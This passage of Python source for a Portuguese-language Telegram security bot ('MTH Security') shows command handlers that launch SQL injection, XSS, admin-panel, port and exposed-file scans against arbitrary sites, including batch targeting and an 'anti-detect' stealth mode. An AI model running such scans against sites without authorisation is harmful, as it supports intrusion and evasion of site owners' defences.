        if resp and resp.status_code == 200:
            text = resp.text
            # Extract key fields
            fields = {
                'Registrar': ['Registrar:', 'Registrar Name:'],
                'Creation Date': ['Creation Date:', 'Creation date:'],
                'Expiry Date': ['Registry Expiry Date:', 'Expiry Date:', 'Expiration Date:'],
                'Status': ['Domain Status:', 'Status:'],
                'Name Server': ['Name Server:', 'Name Server:', 'Nserver:'],
                'DNSSEC': ['DNSSEC:', 'DNSSEC:'],
            }
            for label, keys in fields.items():
                for key in keys:
                    idx = text.find(key)
                    if idx != -1:
                        val = text[idx + len(key):].split('\n')[0].strip()
                        if val and len(val) < 200:
                            results += f"📌 <b>{label}:</b> {escape_html(val)}\n"
                            break
        else:
            # Fallback: use ip-api.com for basic info
            resp2 = _safe_get(f"http://ip-api.com/json/{domain}?fields=query,status,country,isp,org,as", timeout=5)
            if resp2 and resp2.status_code == 200:
                data = resp2.json()
                if data.get('status') == 'success':
                    results += f"📌 <b>IP:</b> {escape_html(data.get('query', 'N/D'))}\n"
                    results += f"📌 <b>ISP:</b> {escape_html(data.get('isp', 'N/D'))}\n"
                    results += f"📌 <b>Org:</b> {escape_html(data.get('org', 'N/D'))}\n"
                    results += f"📌 <b>ASN:</b> {escape_html(data.get('as', 'N/D'))}\n"
    except Exception as e:
        results += f"❌ Erro: {escape_html(str(e))}"
    results += "━━━━━━━━━━━━━━━━━━━━━━"
    send_message_safe(chat_id, results)

def handle_ip(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_message_safe(chat_id, "❌ Use: /ip &lt;ip&gt;\nExemplo: /ip 8.8.8.8")
        return
    target = args[0]
    log_command(user_id, username, "ip", target)
    clean_target = extract_hostname(target)
    send_message_safe(chat_id, f"🔍 <b>GeoIP</b> de {escape_html(clean_target)}...")
    results = f"📍 <b>GeoIP Avançado</b> — {escape_html(clean_target)}\n━━━━━━━━━━━━━━━━━━━━━━\n"
    try:
        resp = _safe_get(f"http://ip-api.com/json/{clean_target}?fields=status,message,country,regionName,city,lat,lon,timezone,isp,org,as,query,reverse,hosting,proxy,mobile", timeout=5)
        if resp and resp.status_code == 200:
            data = resp.json()
            if data.get('status') == 'success':
                results += f"🌍 <b>País:</b> {escape_html(data.get('country', 'N/D'))}\n"
                results += f"📍 <b>Região:</b> {escape_html(data.get('regionName', 'N/D'))}\n"
                results += f"🏙️ <b>Cidade:</b> {escape_html(data.get('city', 'N/D'))}\n"
                results += f"📡 <b>ISP:</b> {escape_html(data.get('isp', 'N/D'))}\n"
                results += f"🌐 <b>Org:</b> {escape_html(data.get('org', 'N/D'))}\n"
                results += f"🔢 <b>ASN:</b> {escape_html(data.get('as', 'N/D'))}\n"
                results += f"🕐 <b>Timezone:</b> {escape_html(data.get('timezone', 'N/D'))}\n"
                if data.get('reverse'):
                    results += f"🔄 <b>Reverse:</b> {escape_html(data['reverse'])}\n"
                # Security indicators
                sec_flags = []
                if data.get('hosting'): sec_flags.append("🖥️ Hosting")
                if data.get('proxy'): sec_flags.append("🔒 Proxy/VPN")
                if data.get('mobile'): sec_flags.append("📱 Mobile")
                if sec_flags:
                    results += f"\n🔍 <b>Tipo:</b> {' '.join(sec_flags)}\n"
            else:
                results += f"❌ {escape_html(data.get('message', 'Query failed'))}"
    except Exception as e:
        results += f"❌ Erro: {escape_html(str(e))}"
    results += "\n━━━━━━━━━━━━━━━━━━━━━━"
    send_message_safe(chat_id, results)

def handle_rate(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_message_safe(chat_id, "❌ Use: /rate &lt;url&gt;\nExemplo: /rate google.com")
        return
    target = args[0]
    log_command(user_id, username, "rate", target)
    clean_target = extract_hostname(target)
    send_message_safe(chat_id, f"🔍 <b>Avaliando segurança</b> de {escape_html(clean_target)}...")
    url = clean_target
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    score = 100
    details = []
    try:
        resp = _safe_get(url, timeout=8)
        if not resp:
            send_message_safe(chat_id, "❌ Não foi possível acessar o site")
            return
        headers = resp.headers
        body = resp.text.lower()
        # Score deductions
        if not headers.get('Strict-Transport-Security'):
            score -= 15; details.append("❌ HSTS ausente (-15)")
        if not headers.get('X-Content-Type-Options'):
            score -= 10; details.append("❌ X-Content-Type-Options ausente (-10)")
        if not headers.get('X-Frame-Options'):
            score -= 10; details.append("❌ X-Frame-Options ausente (-10)")
        if not headers.get('Content-Security-Policy'):
            score -= 15; details.append("❌ CSP ausente (-15)")
        if not headers.get('Referrer-Policy'):
            score -= 5; details.append("❌ Referrer-Policy ausente (-5)")
        if headers.get('Server', '').lower() in ('nginx', 'apache'):
            pass  # normal
        if 'jquery' in body:
            score -= 5; details.append("⚠️ jQuery detectado (potencial XSS) (-5)")
        if 'wp-login.php' in body or 'wp-content' in body:
            score -= 10; details.append("⚠️ WordPress detectado (-10)")
        # Check HTTPS
        if url.startswith('http://') and not url.startswith('https://'):
            score -= 20; details.append("❌ Sem HTTPS (-20)")
        score = max(0, min(100, score))
        if score >= 90: grade = "🅰️ A — Excelente"
        elif score >= 75: grade = "🅱️ B — Bom"
        elif score >= 60: grade = "🇨 C — Razoável"
        elif score >= 40: grade = "🇩 D — Fraco"
        elif score >= 20: grade = "🇪 E — Crítico"
        else: grade = "🇫 F — Péssimo"
        msg = f"📊 <b>Nota de Segurança</b> — {escape_html(clean_target)}\n━━━━━━━━━━━━━━━━━━━━━━\n"
        msg += f"🏆 <b>{score}/100</b> — {grade}\n\n"
        msg += "<b>Detalhes:</b>\n"
        for d in details[:8]:
            msg += f"  {d}\n"
        if not details:
            msg += "  ✅ Tudo OK!\n"
        msg += "━━━━━━━━━━━━━━━━━━━━━━"
        send_message_safe(chat_id, msg)
    except Exception as e:
        send_message_safe(chat_id, f"❌ Erro: {escape_html(str(e))}")

def handle_compare(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args or len(args) < 2:
        send_message_safe(chat_id, "❌ Use: /compare &lt;url1&gt; &lt;url2&gt;\nExemplo: /compare google.com example.com")
        return
    target1 = args[0]
    target2 = args[1]
    log_command(user_id, username, "compare", f"{target1} vs {target2}")
    clean1 = extract_hostname(target1)
    clean2 = extract_hostname(target2)
    send_message_safe(chat_id, f"🔍 <b>Comparando</b> {escape_html(clean1)} vs {escape_html(clean2)}...")
    def get_headers_score(url):
        u = url
        if not u.startswith(('http://', 'https://')):
            u = 'http://' + u
        try:
            r = _safe_get(u, timeout=5)
            if not r: return 0
            h = r.headers
            s = 0
            if h.get('Strict-Transport-Security'): s += 20
            if h.get('X-Content-Type-Options'): s += 15
            if h.get('X-Frame-Options'): s += 15
            if h.get('Content-Security-Policy'): s += 25
            if h.get('Referrer-Policy'): s += 10
            if h.get('X-XSS-Protection'): s += 10
            if h.get('Permissions-Policy'): s += 5
            return s
        except: return 0
    s1 = get_headers_score(target1)
    s2 = get_headers_score(target2)
    msg = f"⚔️ <b>Comparação</b>\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
    msg += f"🌐 <b>{escape_html(clean1)}</b>\n"
    msg += f"   📊 Score: {s1}/100\n\n"
    msg += f"🌐 <b>{escape_html(clean2)}</b>\n"
    msg += f"   📊 Score: {s2}/100\n\n"
    winner = clean1 if s1 > s2 else clean2
    msg += f"🏆 <b>Mais seguro:</b> {escape_html(winner)} ({max(s1,s2)} pts)\n"
    msg += "━━━━━━━━━━━━━━━━━━━━━━"
    send_message_safe(chat_id, msg)

def handle_history(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_message_safe(chat_id, "❌ Use: /history &lt;url&gt;\nExemplo: /history google.com")
        return
    target = args[0]
    log_command(user_id, username, "history", target)
    clean_target = extract_hostname(target)
    send_message_safe(chat_id, f"🔍 <b>Histórico de scans</b> em {escape_html(clean_target)}...")
    try:
        with sqlite3.connect(DB_PATH) as conn:
            conn.row_factory = sqlite3.Row
            c = conn.cursor()
            c.execute("SELECT cmd, created_at FROM scan_cache WHERE target LIKE ? ORDER BY created_at DESC LIMIT 15", (f"%{clean_target}%",))
            rows = c.fetchall()
            if rows:
                msg = f"📋 <b>Histórico de Scans</b> — {escape_html(clean_target)}\n━━━━━━━━━━━━━━━━━━━━━━\n"
                for r in rows:
                    ts = datetime.fromtimestamp(r['created_at']).strftime('%d/%m %H:%M') if r['created_at'] else 'N/D'
                    msg += f"  → /{escape_html(r['cmd'])} em {ts}\n"
                msg += "━━━━━━━━━━━━━━━━━━━━━━"
                send_message_safe(chat_id, msg)
            else:
                send_message_safe(chat_id, "ℹ️ Nenhum scan encontrado para este target.")
    except Exception as e:
        send_message_safe(chat_id, f"❌ Erro: {escape_html(str(e))}")

def handle_top(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not is_owner(user_id):
        send_message_safe(chat_id, "🚫 <b>Acesso negado!</b> Este comando é restrito aos donos do bot.")
        return
    log_command(user_id, username, "top", "")
    send_message_safe(chat_id, "🔍 <b>Carregando top sites vulneráveis...</b>")
    try:
        with sqlite3.connect(DB_PATH) as conn:
            conn.row_factory = sqlite3.Row
            c = conn.cursor()
            c.execute("SELECT target, COUNT(*) as scan_count FROM scan_cache GROUP BY target ORDER BY scan_count DESC LIMIT 15")
            rows = c.fetchall()
            if rows:
                msg = f"🏆 <b>Top Sites Mais Escaneados</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
                for i, r in enumerate(rows, 1):
                    emoji = "🥇" if i == 1 else "🥈" if i == 2 else "🥉" if i == 3 else "📌"
                    msg += f"{emoji} <b>#{i}</b> {escape_html(r['target'][:50])} ({r['scan_count']} scans)\n"
                msg += "━━━━━━━━━━━━━━━━━━━━━━"
                send_message_safe(chat_id, msg)
            else:
                send_message_safe(chat_id, "ℹ️ Nenhum scan registrado ainda.")
    except Exception as e:
        send_message_safe(chat_id, f"❌ Erro: {escape_html(str(e))}")

def handle_pdf(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if len(args) < 2:
        send_message_safe(chat_id, "❌ Use: /pdf &lt;comando&gt; &lt;url&gt;\nExemplo: /pdf sqli google.com/?id=1")
        return
    scan_cmd = args[0]
    target = args[1]
    log_command(user_id, username, "pdf", f"{scan_cmd} {target}")
    clean_target = extract_hostname(target)
    send_message_safe(chat_id, f"🔍 <b>Gerando relatório PDF</b> de /{scan_cmd} em {escape_html(clean_target)}...")
    # Run the scan first
    tool_map = {
        'sqli': tool_sqli, 'xss': tool_xss_scanner, 'admin': tool_admin_finder,
        'ports': tool_port_scanner, 'dirs': tool_directory_scanner,
        'sub': tool_subdomain_scanner, 'wp': tool_wordpress_scanner,
        'dns': tool_dns_tools, 'cms': tool_cms_detector,
        'reverse': tool_reverse_ip, 'ftpssh': tool_ftp_ssh,
        'info': tool_website_info, 'emails': tool_email_scraper,
        'ssl': tool_ssl_audit, 'headers': tool_headers_analysis,
        'cors': tool_cors_test, 'robots': tool_robots_txt,
        'sitemap': tool_sitemap, 'tech': tool_tech_detect,
        'exposed': tool_exposed_files, 'backup': tool_backup_finder,
        'api': tool_api_discovery, 'shell': tool_webshell_hunter,
        'config': tool_config_scanner,
    }
    tool_fn = tool_map.get(scan_cmd)
    if not tool_fn:
        send_message_safe(chat_id, f"❌ Comando /{scan_cmd} não suportado para PDF.")
        return
    try:
        result = tool_fn(target)
        # Strip HTML tags for plain text report
        clean_result = result
        for tag in ['<b>', '</b>', '<code>', '</code>']:
            clean_result = clean_result.replace(tag, '')
        clean_result = re.sub(r'<[^>]+>', '', clean_result)
        report = f"MTH Security - Relatório de Scan\n"
        report += f"Data: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        report += f"Commando: /{scan_cmd} {target}\n"
        report += f"Target: {clean_target}\n"
        report += "=" * 60 + "\n\n"
        report += clean_result
        success = send_document(chat_id, report, f"scan_report_{scan_cmd}_{clean_target}.txt")
        if success:
            send_message_safe(chat_id, "📄 <b>Relatório exportado com sucesso!</b>")
        else:
            send_message_safe(chat_id, "❌ Falha ao enviar o relatório.")
    except Exception as e:
        send_message_safe(chat_id, f"❌ Erro: {escape_html(str(e))}")

def handle_schedule(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if len(args) < 3:
        send_message_safe(chat_id, "❌ Use: /schedule &lt;minutos&gt; &lt;comando&gt; &lt;url&gt;\nExemplo: /schedule 30 sqli google.com/?id=1")
        return
    minutes = int(args[0])
    scan_cmd = args[1]
    target = args[2]
    log_command(user_id, username, "schedule", f"{scan_cmd} {target} +{minutes}min")
    clean_target = extract_hostname(target)
    scheduled_time = time.time() + (minutes * 60)
    task_id = f"sched_{user_id}_{int(time.time())}"
    try:
        with sqlite3.connect(DB_PATH) as conn:
            c = conn.cursor()
            c.execute("INSERT INTO scheduled_tasks (user_id, chat_id, cmd, target, scheduled_time, status, created_at) VALUES (?, ?, ?, ?, ?, 'pending', ?)",
                      (user_id, chat_id, scan_cmd, target, scheduled_time, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
            conn.commit()
        dt = datetime.fromtimestamp(scheduled_time).strftime('%d/%m %H:%M')
        send_message_safe(chat_id, f"⏰ <b>Scan agendado!</b>\n━━━━━━━━━━━━━━━━━━━━━━\n📋 /{scan_cmd} {clean_target}\n🕐 Execução: {dt} ({minutes}min)\n━━━━━━━━━━━━━━━━━━━━━━")
    except Exception as e:
        send_message_safe(chat_id, f"❌ Erro ao agendar: {escape_html(str(e))}")


# ═══════════════════════════════════════════════════════════════
#  V5.0: OWNER HANDLERS
# ═══════════════════════════════════════════════════════════════

def handle_maintenance(chat_id, user_id, username, first_name, last_name, args):
    global MAINTENANCE_MODE, MAINTENANCE_MSG
    log_user(user_id, username, first_name, last_name)
    if not is_owner(user_id):
        send_message_safe(chat_id, "🚫 <b>Acesso negado!</b>")
        return
    log_owner_command(user_id, username, "maintenance")
    audit_log(user_id, username, "maintenance", ' '.join(args) if args else "")
    if not args:
        MAINTENANCE_MODE = not MAINTENANCE_MODE
        status = "ATIVADO" if MAINTENANCE_MODE else "DESATIVADO"
        send_message_safe(chat_id, f"🔧 <b>Modo manutenção {status}</b>")
    else:
        msg = ' '.join(args)
        if msg.lower() in ('on', 'enable', 'ligar'):
            MAINTENANCE_MODE = True
            send_message_safe(chat_id, f"🔧 <b>Modo manutenção ATIVADO</b>\nMensagem: {escape_html(msg)}")
        elif msg.lower() in ('off', 'disable', 'desligar'):
            MAINTENANCE_MODE = False
            MAINTENANCE_MSG = ""
            send_message_safe(chat_id, "🔧 <b>Modo manutenção DESATIVADO</b>")
        else:
            MAINTENANCE_MODE = True
            MAINTENANCE_MSG = msg
            send_message_safe(chat_id, f"🔧 <b>Modo manutenção ATIVADO</b>\nMensagem: {escape_html(msg)}")

def handle_cooldown(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not is_owner(user_id):
        send_message_safe(chat_id, "🚫 <b>Acesso negado!</b>")
        return
    log_owner_command(user_id, username, "cooldown")
    if not args or len(args) < 2:
        send_message_safe(chat_id, "❌ Use: /cooldown &lt;user_id&gt; &lt;limite&gt; [janela]\nExemplo: /cooldown 123456 5 60")
        return
    target_uid = int(args[0])
    limit = int(args[1])
    window = int(args[2]) if len(args) > 2 else 60
    CUSTOM_RATE_LIMITS[target_uid] = {'limit': limit, 'window': window}
    audit_log(user_id, username, "cooldown", f"Set rate limit {limit}/{window}s for user {target_uid}")
    send_message_safe(chat_id, f"✅ <b>Rate limit configurado</b>\nUser: {target_uid}\nLimite: {limit} cmds / {window}s")

def handle_vip(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not is_owner(user_id):
        send_message_safe(chat_id, "🚫 <b>Acesso negado!</b>")
        return
    log_owner_command(user_id, username, "vip")
    if not args or len(args) < 2:
        send_message_safe(chat_id, "❌ Use: /vip &lt;add|remove&gt; &lt;user_id&gt;\nExemplo: /vip add 123456")
        return
    action = args[0].lower()
    target_uid = int(args[1])
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    if action == 'add':
        VIP_USERS.add(target_uid)
        try:
            with sqlite3.connect(DB_PATH) as conn:
                c = conn.cursor()
                c.execute("INSERT OR REPLACE INTO vip_users (user_id, username, added_at, added_by) VALUES (?, ?, ?, ?)",
                          (target_uid, f"@{args[2]}" if len(args) > 2 else "N/D", now, user_id))
                conn.commit()
            audit_log(user_id, username, "vip_add", f"Added VIP user {target_uid}")
            send_message_safe(chat_id, f"✅ <b>VIP adicionado!</b>\nUser: {target_uid} — Sem rate limit, scans prioritários.")
        except Exception as e:
            send_message_safe(chat_id, f"❌ Erro: {escape_html(str(e))}")
    elif action == 'remove':
        VIP_USERS.discard(target_uid)
        try:
            with sqlite3.connect(DB_PATH) as conn:
                c = conn.cursor()
                c.execute("DELETE FROM vip_users WHERE user_id = ?", (target_uid,))
                conn.commit()
            audit_log(user_id, username, "vip_remove", f"Removed VIP user {target_uid}")
            send_message_safe(chat_id, f"🚫 <b>VIP removido!</b>\nUser: {target_uid}")
        except Exception as e:
            send_message_safe(chat_id, f"❌ Erro: {escape_html(str(e))}")
    else:
        send_message_safe(chat_id, "❌ Use: /vip &lt;add|remove&gt; &lt;user_id&gt;")

def handle_log(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not is_owner(user_id):
        send_message_safe(chat_id, "🚫 <b>Acesso negado!</b>")
        return
    log_owner_command(user_id, username, "log")
    # This is the audit log command (detailed)
    if not args:
        send_message_safe(chat_id, "❌ Use: /log &lt;user_id&gt; ou /log audit\nExemplo: /log 123456")
        return
    query = args[0]
    try:
        with sqlite3.connect(DB_PATH) as conn:
            conn.row_factory = sqlite3.Row
            c = conn.cursor()
            if query == 'audit':
                c.execute("SELECT * FROM audit_log ORDER BY timestamp DESC LIMIT 20")
                rows = c.fetchall()
                msg = "📋 <b>Audit Log (últimos 20)</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
                for r in rows:
                    msg += f"  [{r['timestamp']}] @{r['username']} — {r['action']}\n    {escape_html(r['details'][:80])}\n"
            else:
                target_uid = int(query)
                c.execute("SELECT timestamp, action, details FROM audit_log WHERE user_id = ? ORDER BY timestamp DESC LIMIT 20", (target_uid,))
                rows = c.fetchall()
                msg = f"📋 <b>Logs do usuário {target_uid}</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
                for r in rows:
                    msg += f"  [{r['timestamp']}] {r['action']} — {escape_html(r['details'][:80])}\n"
                if not rows:
                    msg += "  ℹ️ Nenhum registro encontrado."
            msg += "━━━━━━━━━━━━━━━━━━━━━━"
            send_message_safe(chat_id, msg)
    except Exception as e:
        send_message_safe(chat_id, f"❌ Erro: {escape_html(str(e))}")

def handle_clearlogs(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not is_owner(user_id):
        send_message_safe(chat_id, "🚫 <b>Acesso negado!</b>")
        return
    log_owner_command(user_id, username, "clearlogs")
    try:
        with sqlite3.connect(DB_PATH) as conn:
            c = conn.cursor()
            c.execute("DELETE FROM logs WHERE timestamp < ?", (datetime.now().strftime("%Y-%m-%d") + " 00:00:00",))
            deleted = c.rowcount
            c.execute("DELETE FROM audit_log WHERE timestamp < ?", (datetime.now().strftime("%Y-%m-%d") + " 00:00:00",))
            audit_deleted = c.rowcount
            conn.commit()
        send_message_safe(chat_id, f"🗑️ <b>Logs limpos!</b>\nLogs antigos: {deleted}\nAudit logs: {audit_deleted}")
    except Exception as e:
        send_message_safe(chat_id, f"❌ Erro: {escape_html(str(e))}")

def handle_broadcast(chat_id, user_id, username, first_name, last_name, args):
    """Schedule a broadcast for later (owner only)"""
    log_user(user_id, username, first_name, last_name)
    if not is_owner(user_id):
        send_message_safe(chat_id, "🚫 <b>Acesso negado!</b>")
        return
    log_owner_command(user_id, username, "broadcast")
    if len(args) < 2:
        send_message_safe(chat_id, "❌ Use: /broadcast &lt;minutos&gt; &lt;texto&gt;\nExemplo: /broadcast 60 Bot vai cair para manutenção em 1 hora")
        return
    minutes = int(args[0])
    message_text = ' '.join(args[1:])
    scheduled_time = time.time() + (minutes * 60)
    try:
        with sqlite3.connect(DB_PATH) as conn:
            c = conn.cursor()
            c.execute("INSERT INTO scheduled_tasks (user_id, chat_id, cmd, target, scheduled_time, status, created_at) VALUES (?, ?, 'broadcast', ?, ?, 'pending', ?)",
                      (user_id, chat_id, message_text, scheduled_time, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
            conn.commit()
        dt = datetime.fromtimestamp(scheduled_time).strftime('%d/%m %H:%M')
        send_message_safe(chat_id, f"📢 <b>Broadcast agendado!</b>\n🕐 Execução: {dt} ({minutes}min)\n━━━━━━━━━━━━━━━━━━━━━━")
    except Exception as e:
        send_message_safe(chat_id, f"❌ Erro: {escape_html(str(e))}")


# V5.0: Stealth and Notify handlers
def handle_stealth(chat_id, user_id, username, first_name, last_name, args):
    """Stealth scan mode - slower but anti-detect"""
    global STEALTH_MODE
    log_user(user_id, username, first_name, last_name)
    if len(args) < 2:
        send_message_safe(chat_id, "❌ Use: /stealth &lt;comando&gt; &lt;url&gt;\nExemplo: /stealth sqli google.com/?id=1")
        return
    scan_cmd = args[0]
    target = args[1]
    log_command(user_id, username, "stealth", f"{scan_cmd} {target}")
    clean_target = extract_hostname(target)
    send_message_safe(chat_id, f"🕵️ <b>Modo Stealth</b> ativado para /{scan_cmd} em {escape_html(clean_target)}...")
    # Enable stealth mode temporarily
    STEALTH_MODE = True
    # Map command to tool function
    tool_map = {
        'sqli': tool_sqli, 'xss': tool_xss_scanner, 'admin': tool_admin_finder,
        'panel': tool_admin_finder, 'ports': tool_port_scanner,
        'dirs': tool_directory_scanner, 'sub': tool_subdomain_scanner,
        'wp': tool_wordpress_scanner, 'dns': tool_dns_tools, 'cms': tool_cms_detector,
        'reverse': tool_reverse_ip, 'ftpssh': tool_ftp_ssh, 'info': tool_website_info,
        'emails': tool_email_scraper, 'ssl': tool_ssl_audit, 'headers': tool_headers_analysis,
        'cors': tool_cors_test, 'robots': tool_robots_txt, 'sitemap': tool_sitemap,
        'tech': tool_tech_detect, 'exposed': tool_exposed_files, 'backup': tool_backup_finder,
        'api': tool_api_discovery, 'shell': tool_webshell_hunter, 'config': tool_config_scanner,
        # V5.1: Aggregated tools — use the same tool_map as batch
        'scanall': tool_website_info,  # scheduled scanall = just info (aggregated needs chat_id)
        'deep': tool_sqli,             # scheduled deep = just sqli
        'quick': tool_website_info,    # scheduled quick = just info
        'http': tool_headers_analysis, # scheduled http = just headers
        'sslchain': tool_ssl_audit,    # scheduled sslchain = just ssl
        'watch': tool_headers_analysis,# scheduled watch = just headers
    }
    tool_fn = tool_map.get(scan_cmd)
    if not tool_fn:
        STEALTH_MODE = False
        send_message_safe(chat_id, f"❌ Comando /{scan_cmd} não suportado em modo stealth.")
        return
    try:
        result = tool_fn(target)
        send_message_safe(chat_id, result)
    finally:
        STEALTH_MODE = False

def handle_notify(chat_id, user_id, username, first_name, last_name, args):
    """Set up notification when a site changes status"""
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_message_safe(chat_id, "❌ Use: /notify &lt;url&gt;\nExemplo: /notify google.com\nUse /notify off para desativar todas.")
        return
    target = args[0]
    if target.lower() == 'off':
        # Remove all notifications for this user
        try:
            with sqlite3.connect(DB_PATH) as conn:
                c = conn.cursor()
                c.execute("DELETE FROM site_monitor WHERE user_id = ?", (user_id,))
                deleted = c.rowcount
                conn.commit()
            send_message_safe(chat_id, f"🔕 <b>Notificações desativadas!</b>\nRemovidos: {deleted} monitoramentos.")
        except Exception as e:
            send_message_safe(chat_id, f"❌ Erro: {escape_html(str(e))}")
        return
    log_command(user_id, username, "notify", target)
    clean_target = extract_hostname(target)
    try:
        with sqlite3.connect(DB_PATH) as conn:
            c = conn.cursor()
            c.execute("INSERT OR REPLACE INTO site_monitor (user_id, target, chat_id, last_status, last_check) VALUES (?, ?, ?, 0, ?)",
                      (user_id, clean_target, chat_id, time.time()))
            conn.commit()
        send_message_safe(chat_id, f"🔔 <b>Notificação ativada!</b>\n━━━━━━━━━━━━━━━━━━━━━━\nVou avisar se {escape_html(clean_target)} mudar de status.\nUse /notify off para desativar.\n━━━━━━━━━━━━━━━━━━━━━━")
    except Exception as e:
        send_message_safe(chat_id, f"❌ Erro: {escape_html(str(e))}")


# ═══════════════════════════════════════════════════════════════
#  V5.1: NEW COMMAND HANDLERS
# ═══════════════════════════════════════════════════════════════

def handle_scanall(chat_id, user_id, username, first_name, last_name, args):
    """V5.1: Scan All — runs info + ports + dns + ssl + headers + exposed on a URL"""
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_message_safe(chat_id, "❌ Use: /scanall &lt;url&gt;\nExemplo: /scanall google.com")
        return
    target = args[0]
    log_command(user_id, username, "scanall", target)
    clean_target = extract_hostname(target)
    send_message_safe(chat_id, f"🔍 <b>Scan Completo</b> em {escape_html(clean_target)}...\nIsso pode levar alguns minutos.")

    results = []
    # Info
    results.append(f"📋 <b>1/6 — Info:</b>")
    r = tool_website_info(target)
    results.append(r.split('\n', 1)[1] if '\n' in r else r)
    send_message_safe(chat_id, "\n".join(results))

    # DNS
    results.append(f"\n📋 <b>2/6 — DNS:</b>")
    r = tool_dns_tools(target)
    results.append(r.split('\n', 1)[1] if '\n' in r else r)
    send_message_safe(chat_id, "\n".join(results))

    # Ports
    results.append(f"\n📋 <b>3/6 — Portas:</b>")
    r = tool_port_scanner(target)
    results.append(r.split('\n', 1)[1] if '\n' in r else r)
    send_message_safe(chat_id, "\n".join(results))

    # SSL
    results.append(f"\n📋 <b>4/6 — SSL/TLS:</b>")
    r = tool_ssl_audit(target)
    results.append(r.split('\n', 1)[1] if '\n' in r else r)
    send_message_safe(chat_id, "\n".join(results))

    # Headers
    results.append(f"\n📋 <b>5/6 — Security Headers:</b>")
    r = tool_headers_analysis(target)
    results.append(r.split('\n', 1)[1] if '\n' in r else r)
    send_message_safe(chat_id, "\n".join(results))

    # Exposed files
    results.append(f"\n📋 <b>6/6 — Arquivos Expostos:</b>")
    r = tool_exposed_files(target)
    results.append(r.split('\n', 1)[1] if '\n' in r else r)
    send_message_safe(chat_id, "\n".join(results))

    send_message_safe(chat_id, f"✅ <b>Scan Completo finalizado</b> em {escape_html(clean_target)}")

def handle_deep(chat_id, user_id, username, first_name, last_name, args):
    """V5.1: Deep Scan — sqli + xss + admin + exposed + shell + config"""
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_message_safe(chat_id, "❌ Use: /deep &lt;url&gt;\nExemplo: /deep site.com/?id=1")
        return
    target = args[0]
    log_command(user_id, username, "deep", target)
    clean_target = extract_hostname(target)
    send_message_safe(chat_id, f"🔍 <b>Deep Scan</b> em {escape_html(clean_target)}...\nVulnerabilidades profundas. Pode demorar.")

    # SQLi
    send_message_safe(chat_id, "📋 <b>1/6 — SQL Injection:</b>")
    r = tool_sqli(target)
    send_message_safe(chat_id, r)

    # XSS
    send_message_safe(chat_id, "📋 <b>2/6 — XSS:</b>")
    r = tool_xss_scanner(target)
    send_message_safe(chat_id, r)

    # Admin
    send_message_safe(chat_id, "📋 <b>3/6 — Admin Panels:</b>")
    r = tool_admin_finder(target)
    send_message_safe(chat_id, r)

    # Exposed
    send_message_safe(chat_id, "📋 <b>4/6 — Arquivos Expostos:</b>")
    r = tool_exposed_files(target)
    send_message_safe(chat_id, r)

    # Webshells
    send_message_safe(chat_id, "📋 <b>5/6 — Webshells:</b>")
    r = tool_webshell_hunter(target)
    send_message_safe(chat_id, r)

    # Config
    send_message_safe(chat_id, "📋 <b>6/6 — Config Files:</b>")
    r = tool_config_scanner(target)
    send_message_safe(chat_id, r)

    send_message_safe(chat_id, f"✅ <b>Deep Scan finalizado</b> em {escape_html(clean_target)}")

def handle_quick(chat_id, user_id, username, first_name, last_name, args):
    """V5.1: Quick Scan — info + headers + rate in one shot"""
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_message_safe(chat_id, "❌ Use: /quick &lt;url&gt;\nExemplo: /quick google.com")
        return
    target = args[0]
    log_command(user_id, username, "quick", target)
    clean_target = extract_hostname(target)
    send_message_safe(chat_id, f"⚡ <b>Quick Scan</b> em {escape_html(clean_target)}...")

    # Info
    r = tool_website_info(target)
    send_message_safe(chat_id, r)

    # Headers
    r = tool_headers_analysis(target)
    send_message_safe(chat_id, r)

    send_message_safe(chat_id, f"✅ <b>Quick Scan finalizado</b> em {escape_html(clean_target)}")

def handle_cancel(chat_id, user_id, username, first_name, last_name, args):
    """V5.1: Cancel any running scan for the user"""
    log_user(user_id, username, first_name, last_name)
    if user_id in STOP_EVENTS:
        STOP_EVENTS[user_id].set()
        send_message_safe(chat_id, "🛑 <b>Scan cancelado!</b> Processos interrompidos.")
    else:
        send_message_safe(chat_id, "ℹ️ <b>Nenhum scan em andamento.</b>")

def handle_batch(chat_id, user_id, username, first_name, last_name, args):
    """V5.1: Batch scan multiple URLs with the same command
    Usage: /batch sqli url1 url2 url3
    """
    log_user(user_id, username, first_name, last_name)
    if len(args) < 2:
        send_message_safe(chat_id, "❌ Use: /batch &lt;comando&gt; &lt;url1&gt; &lt;url2&gt; ...\nExemplo: /batch sqli site1.com site2.com site3.com")
        return
    scan_cmd = args[0]
    targets = args[1:]
    log_command(user_id, username, "batch", f"{scan_cmd} x{len(targets)} targets")
    send_message_safe(chat_id, f"🔍 <b>Batch Scan</b> — {len(targets)} targets com /{scan_cmd}...\n⚠️ Use /cancel para parar.")

    # V5.1: Create stop event so /cancel works
    STOP_EVENTS[user_id] = threading.Event()

    tool_map = {
